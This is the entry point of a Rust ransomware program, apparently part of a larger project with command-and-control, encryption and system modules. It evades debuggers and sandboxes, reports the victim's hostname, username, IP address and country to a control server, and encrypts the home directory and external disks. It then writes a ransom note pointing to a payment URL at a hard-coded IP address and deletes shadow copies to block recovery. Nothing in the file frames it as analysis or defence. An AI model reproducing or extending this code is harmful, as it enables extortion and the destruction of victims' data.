mod c2;
mod encryption;
mod system;
use base64::{engine::general_purpose, Engine as _};
use serde_json::json;
use std::{
    env,
    fs::{read_to_string, File, OpenOptions},
    io::Write,
    process::exit,
};

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected()
        {
            let c2 = c2::api::C2API::new();

            let public_ip_info = c2.get_public_ip_info().await;
            if public_ip_info["data"] == json!({}) {
                println!("Error: {}", public_ip_info["error"]["errorMsg"]);
                exit(-1);
            }

            let c2 = c2::api::C2API::new();

            let host = system::info::get_hostname();
            let hook_user = system::info::get_username();

            let body = json!({
                "versionOS": system::info::get_version(),
                "host": host.clone(),
                "hookUser": hook_user.clone(),
                "ip": public_ip_info["data"]["ip"].to_string().replace("\"", "").replace("\\", ""),
                "country": public_ip_info["data"]["country"].to_string().replace("\"", "").replace("\\", "")
            });

            let api_res = c2.post(&body, "agent/new").await;
            if api_res["data"] == json!({}) {
                println!("Error: {}", api_res["error"]["errorMsg"]);
                exit(-1);
            }

            let agent_tag = api_res["data"]["id"].to_string() + "#" + &host + "#" + &hook_user;
            let encoded: String = general_purpose::STANDARD_NO_PAD.encode(agent_tag.as_bytes());

            // Clean received public key
            let private_public_key = api_res["data"]["publicKey"]
                .to_string()
                .replace("\\n", "\n")
                .replace("\"", "");

            encryption::file::multi_threaded_encrypt_decrypt_files(
                system::info::get_user_home().to_str().unwrap(),
                private_public_key.clone(),
                api_res["data"]["id"].to_string(),
                1,
            );
            encryption::disk::encrypt_decrypt_external_disks(
                private_public_key,
                api_res["data"]["id"].to_string(),
                1,
            );

            let mut file = OpenOptions::new()
                .create_new(true)
                .write(true)
                .append(true)
                .open("HELP_RECOVER_ALL_MY_FILES.txt")
                .unwrap();
            let message =
                String::from("To recover your files please Go to https://82.66.179.79/userpay/")
                    + &encoded;
            file.write_all(message.as_bytes()).unwrap();

            system::file::delete_shadow_copies();
        }
    } else {
        let private_key = read_to_string(&args[1][..]).unwrap();
        encryption::file::multi_threaded_encrypt_decrypt_files(
            system::info::get_user_home().to_str().unwrap(),
            private_key.clone(),
            String::from("0"),
            0,
        );
        encryption::disk::encrypt_decrypt_external_disks(private_key, String::from("0"), 0);
    }

    exit(0);
}
